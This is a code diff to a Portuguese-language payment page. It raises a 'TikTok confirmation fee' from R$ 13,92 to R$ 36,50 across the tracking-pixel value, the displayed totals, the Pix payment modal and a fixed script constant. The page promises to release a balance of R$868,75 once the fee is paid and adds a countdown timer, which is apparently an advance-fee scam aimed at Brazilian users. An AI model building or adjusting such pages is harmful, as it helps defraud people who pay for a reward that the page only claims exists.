@@ -16,7 +16,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     p = Object.assign({}, p || {});
     var cid = String(p.content_id || (p.contents && p.contents[0] && p.contents[0].content_id) || 'taxa_confirmacao_tiktok').trim() || 'taxa_confirmacao_tiktok';
     var cname = String(p.content_name || (p.contents && p.contents[0] && p.contents[0].content_name) || 'Taxa de Confirmacao TikTok').trim() || 'Taxa de Confirmacao TikTok';
-    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 13.92);
+    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 36.50);
     p.content_id = cid; p.content_ids = [cid]; p.content_type = 'product'; p.content_name = cname; p.value = val; p.currency = p.currency || 'BRL';
     p.contents = [{ content_id: cid, content_type: 'product', content_name: cname, quantity: 1, price: val }];
     return p;
@@ -157,12 +157,12 @@ body.modal-open{overflow:hidden;position:fixed;width:100%}
       </div>
       <div>
         <p class="confirm-name">Taxa de Confirmação</p>
-        <p class="confirm-price" id="priceConfirm">R$ 13,92</p>
+        <p class="confirm-price" id="priceConfirm">R$ 36,50</p>
       </div>
     </div>
     <div class="total-row">
           <span class="total-label">Total:</span>
-          <span class="total-value" id="priceTotal">R$ 13,92</span>
+          <span class="total-value" id="priceTotal">R$ 36,50</span>
         </div>
     <div class="libera-badge">✓ Pague e libere seus <strong id="saldoBadge">R$868,75</strong> imediatamente</div>
   </div>
@@ -221,7 +221,7 @@ body.modal-open{overflow:hidden;position:fixed;width:100%}
     <h2 class="modal-title">Pagamento Gerado!</h2>
     <p class="modal-subtitle">Olá, <strong id="nomeModal">—</strong>! Escaneie ou copie o código abaixo.</p>
     <p class="modal-expiry">Expira em: <span id="expiryTime">--/--/---- --:--:--</span></p>
-    <p class="modal-value" id="priceModal">R$ 13,92</p>
+    <p class="modal-value" id="priceModal">R$ 36,50</p>
     <div class="timer-wrap">
       <span class="timer-label">Tempo restante:</span>
       <span class="timer-count" id="timerCount">10:00</span>
@@ -248,7 +248,7 @@ body.modal-open{overflow:hidden;position:fixed;width:100%}
         <div class="how-step-row"><div class="how-step-num">1</div><p class="how-step-desc">Abra o app do seu banco e vá em <strong>Pix</strong></p></div>
         <div class="how-step-row"><div class="how-step-num">2</div><p class="how-step-desc">Escolha a opção <strong>Pix Copia e Cola</strong></p></div>
         <div class="how-step-row"><div class="how-step-num">3</div><p class="how-step-desc">Clique em <strong>Copiar Código PIX</strong> abaixo e cole no seu banco</p></div>
-        <div class="how-step-row"><div class="how-step-num">4</div><p class="how-step-desc">Confira o valor de <strong id="priceStep">R$ 13,92</strong> e confirme</p></div>
+        <div class="how-step-row"><div class="how-step-num">4</div><p class="how-step-desc">Confira o valor de <strong id="priceStep">R$ 36,50</strong> e confirme</p></div>
       </div>
     </div>
     <div class="pix-code-row">
@@ -268,7 +268,7 @@ body.modal-open{overflow:hidden;position:fixed;width:100%}
 (function(){
   var params = new URLSearchParams(window.location.search);
   var totalParam = parseFloat(params.get('total')) || 868.75;
-  var taxaParam = 13.92; // fixo
+  var taxaParam = 36.50; // fixo
   var emailParam = params.get('email') || '';
 
   function fmtBRL(v){ return 'R$ '+v.toFixed(2).replace('.',','); }
